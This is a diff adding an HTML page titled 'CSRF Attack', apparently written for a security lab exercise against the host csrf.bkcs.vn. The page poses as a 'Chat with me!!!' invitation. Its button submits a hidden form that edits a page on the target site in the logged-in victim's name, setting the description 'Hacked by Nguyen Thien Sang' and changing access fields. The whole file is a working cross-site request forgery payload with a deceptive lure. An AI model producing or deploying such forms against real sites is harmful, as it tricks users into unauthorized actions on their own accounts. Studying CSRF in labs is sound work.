@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <h1>Chat with me!!!</h1>
+    <form method="post" action="http://csrf.bkcs.vn/action/pages/edit">
+        <button class="button-5" type="submit" role="button">Click here to chat</button>
+        <br>
+        <input type="hidden" name="title" value="Someone created this page, not me!!!">
+        <br>
+        <input type="hidden" name="description" value="Hacked by Nguyen Thien Sang">
+        <br>
+        <input type="hidden" name="tags" value="test_csrf">
+        <br>
+        <input type="hidden" name="access_id" value="2">
+        <br>
+        <input type="hidden" name="write_access_id" value="1">
+        <br>
+        <input type="hidden" name="parent_guid" value="0">
+    </form>
+</body>
+</html>
